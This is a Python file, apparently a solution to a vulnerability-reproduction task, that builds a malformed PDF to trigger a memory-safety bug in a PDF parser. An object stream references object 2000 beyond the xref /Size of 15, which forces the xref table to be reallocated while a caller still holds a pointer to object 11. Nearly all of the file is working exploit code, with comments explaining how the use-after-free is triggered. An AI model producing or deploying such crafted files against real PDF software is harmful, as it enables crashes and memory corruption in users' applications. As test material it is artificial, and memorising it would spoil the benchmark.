import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Header
        header = b"%PDF-1.7\n"
        
        # Object 10: Object Stream (ObjStm)
        # It contains two objects: 11 (victim) and 2000 (trigger).
        # When Obj 11 is accessed, Obj 10 is loaded.
        # Parsing Obj 10's index encounters Obj 2000.
        # Since 2000 > /Size 15 (defined in XRef), the xref table is reallocated.
        # This invalidates the pointer to Obj 11 held by the caller.
        
        # Index: "11 0 2000 10 " (13 bytes)
        # Content at 0: "<<>>" (Obj 11)
        # Content at 10: "<<>>" (Obj 2000)
        # Padding needed: 10 - 4 = 6 bytes.
        stm_content = b"11 0 2000 10 <<>>      <<>>"
        
        # Construct Object 10
        # /First 13 matches the length of the index string
        obj10_head = b"10 0 obj\n"
        obj10_dict = b"<< /Type /ObjStm /N 2 /First 13 /Length 27 >>\n"
        obj10_stream = b"stream\n" + stm_content + b"\nendstream\n"
        obj10_end = b"endobj\n"
        
        obj10 = obj10_head + obj10_dict + obj10_stream + obj10_end
        
        # Calculate offsets
        offset_10 = len(header)
        offset_5 = offset_10 + len(obj10)
        
        # Construct XRef Stream (Object 5)
        # Entries: 0 (free), 5 (xref), 10 (objstm), 11 (compressed in 10)
        # We purposely omit 2000 to force resizing.
        
        # Entry 0: Free
        entry0 = b'\x00\x00\x00\xff'
        
        # Entry 5: Type 1 (in use), offset = offset_5
        # Using big-endian unsigned short (>H) for 2-byte field
        entry5 = b'\x01' + struct.pack('>H', offset_5) + b'\x00'
        
        # Entry 10: Type 1 (in use), offset = offset_10
        entry10 = b'\x01' + struct.pack('>H', offset_10) + b'\x00'
        
        # Entry 11: Type 2 (compressed), stm_ofs = 10, index = 0
        entry11 = b'\x02' + struct.pack('>H', 10) + b'\x00'
        
        xref_data = entry0 + entry5 + entry10 + entry11
        
        obj5_head = b"5 0 obj\n"
        # /Root 11 0 R triggers the access to Obj 11
        # /Size 15 is small enough to trigger resize when 2000 is seen
        # /W [1 2 1] defines field widths: 1 byte type, 2 bytes offset, 1 byte gen
        # /Index [0 1 5 1 10 2] maps the data to obj nums 0, 5, 10, 11
        obj5_dict = (f"<< /Type /XRef /Size 15 /Root 11 0 R /W [1 2 1] "
                     f"/Index [0 1 5 1 10 2] /Length {len(xref_data)} >>\n").encode()
        obj5_stream = b"stream\n" + xref_data + b"\nendstream\n"
        obj5_end = b"endobj\n"
        
        obj5 = obj5_head + obj5_dict + obj5_stream + obj5_end
        
        # Trailer / Footer
        footer = b"startxref\n" + str(offset_5).encode() + b"\n%%EOF\n"
        
        return header + obj10 + obj5 + footer
